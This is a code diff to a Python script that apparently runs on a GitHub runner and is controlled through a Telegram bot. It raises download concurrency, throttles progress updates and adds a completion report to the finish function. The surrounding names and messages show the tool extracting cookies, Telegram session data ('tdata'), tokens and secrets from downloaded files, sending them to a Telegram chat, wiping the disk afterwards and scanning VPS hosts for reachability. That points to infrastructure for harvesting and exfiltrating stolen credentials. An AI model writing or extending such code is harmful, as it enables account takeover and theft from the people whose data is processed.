@@ -552,10 +552,10 @@ def download(url):
     t0 = time.time()
     found = None
     if use_aria:
-        cmd = [ "aria2c", "--dir", str(dest), "--split=3", "--max-connection-per-server=3",
+        cmd = [ "aria2c", "--dir", str(dest), "--split=8", "--max-connection-per-server=8",
                 "--min-split-size=1M", "--file-allocation=none", "--auto-file-renaming=false",
                 "--allow-overwrite=true", "--console-log-level=warn", "--summary-interval=1",
-                "--user-agent=Mozilla/5.0" ]
+                "--max-tries=10", "--retry-wait=2", "--user-agent=Mozilla/5.0" ]
         if shutil.which("stdbuf"):
             cmd = ["stdbuf", "-oL", "-eL"] + cmd
         if fname:
@@ -566,6 +566,7 @@ def download(url):
         pe = re.compile(r"\[#\w+\s+([\d.]+\w+)/([\d.]+\w+)\((\d+)%\)")
         se = re.compile(r"DL:([\d.]+\w+)")
         tail = []
+        last_dl_tick = 0.0
         for raw in pr.stdout:
             if stop():
                 pr.terminate(); return None
@@ -574,10 +575,14 @@ def download(url):
             m = pe.search(raw)
             if m:
                 s = se.search(raw)
-                st("download", 4 + int(m.group(3)) * 0.26, got=m.group(1),
-                   total=m.group(2) if fsize == 0 else fs(fsize),
-                   speed=(s.group(1) + "/s") if s else "-", elapsed=ft(time.time() - t0),
-                   file=fname, size=fsize)
+                pct_dl = 4 + int(m.group(3)) * 0.26
+                now_t = time.time()
+                if (pct_dl - _state.get("pct", 0) >= 3) or (now_t - last_dl_tick >= 2.5):
+                    last_dl_tick = now_t
+                    st("download", pct_dl, got=m.group(1),
+                       total=m.group(2) if fsize == 0 else fs(fsize),
+                       speed=(s.group(1) + "/s") if s else "-", elapsed=ft(now_t - t0),
+                       file=fname, size=fsize)
             fm = re.search(r"Download complete:\s*(.+)", raw)
             if fm: found = fm.group(1).strip()
         pr.wait()
@@ -1874,6 +1879,72 @@ def pack_secrets(files):
 
 def finish(task, stage, **extra):
     """Terminal state for a job: paint the card, report to the bot, back to idle."""
+    if stage == "done":
+        # 1. Delete the live console card message immediately
+        if CHAT and PB[1]:
+            try:
+                r = requests.post(TG_API + "deleteMessage", timeout=10, json={
+                    "chat_id": CHAT, "message_id": PB[1]
+                })
+                sys.stdout.write("Live card %s deleted, rc=%s\n" % (PB[1], r.status_code))
+                sys.stdout.flush()
+            except Exception as e:
+                sys.stdout.write("Delete live card err: %s\n" % e)
+                sys.stdout.flush()
+            PB[1] = None
+
+        # 2. Send Task Complete ✅
+        if CHAT:
+            try:
+                tot_elapsed = ft(time.time() - (PB[2] or time.time()))
+                is_vps = task.get("kind") in ("vps_promox", "vps_check")
+                if is_vps:
+                    lines = [
+                        "✦ <b>Task Complete ✅</b>",
+                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+                        "📦 <b>Status:</b> VPS scan completed",
+                        f"🔎 <b>Total:</b> <code>{extra.get('total', 0)}</code>",
+                        f"🌐 <b>Reachable:</b> <code>{extra.get('reach', extra.get('valid', 0))}</code>",
+                        f"⏱ <b>Elapsed:</b> <code>{tot_elapsed}</code>",
+                        f"🖥 <b>Runner:</b> <code>github-runner</code>",
+                    ]
+                else:
+                    cookies_cnt = extra.get("cookies", 0)
+                    sent_cnt = len(extra.get("sent") or [])
+                    lines = [
+                        "✦ <b>Task Complete ✅</b>",
+                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+                        "📦 <b>Status:</b> All files extracted & delivered",
+                        f"📤 <b>Files sent:</b> <code>{sent_cnt}</code>",
+                        f"🍪 <b>Sessions:</b> <code>{cookies_cnt}</code>",
+                    ]
+                    if extra.get("td_total"):
+                        lines.append(f"🗃 <b>Tdata:</b> <code>{extra['td_total']}</code>")
+                    if extra.get("tok_total"):
+                        lines.append(f"🎟 <b>Tokens:</b> <code>{extra['tok_total']}</code>")
+                    if extra.get("js_total"):
+                        lines.append(f"🗂 <b>JSON:</b> <code>{extra['js_total']}</code>")
+                    if extra.get("sec_total"):
+                        lines.append(f"🗝 <b>Secrets:</b> <code>{extra['sec_total']}</code>")
+                    lines.extend([
+                        f"🖥 <b>Runner:</b> <code>github-runner</code>",
+                        f"🧹 <b>Disk:</b> Wiped clean",
+                        f"⏱ <b>Elapsed:</b> <code>{tot_elapsed}</code>",
+                    ])
+                requests.post(TG_API + "sendMessage", timeout=15, json={
+                    "chat_id": CHAT,
+                    "text": "\n".join(lines),
+                    "parse_mode": "HTML",
+                    "reply_markup": {
+                        "inline_keyboard": [
+                            [{"text": "« Back to Menu", "callback_data": "menu_home"}]
+                        ]
+                    }
+                })
+            except Exception as e:
+                sys.stdout.write("Send Task Complete err: %s\n" % e)
+                sys.stdout.flush()
+
     st(stage, 100 if stage == "done" else _state.get("pct", 0),
        job=task.get("job"), vm=SPECS,
        **{k: extra[k] for k in extra if k in ("err", "tried")})
